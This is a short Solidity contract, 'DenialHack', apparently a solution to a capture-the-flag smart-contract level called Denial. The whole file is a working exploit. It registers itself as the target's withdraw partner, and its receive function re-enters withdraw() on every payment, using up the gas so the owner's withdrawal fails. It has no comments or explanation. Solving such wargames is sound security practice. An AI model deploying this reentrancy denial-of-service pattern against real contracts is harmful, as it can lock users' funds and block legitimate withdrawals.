// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IDenial {
    function withdraw() external payable;
    function setWithdrawPartner(address _partner) external;
}

contract DenialHack {
    address denial;

    constructor(address denial_) {
        denial = denial_;
    }

    function attack() public payable {
        IDenial(denial).setWithdrawPartner(address(this));
    }

    receive() external payable {
        IDenial(denial).withdraw();
    }
}
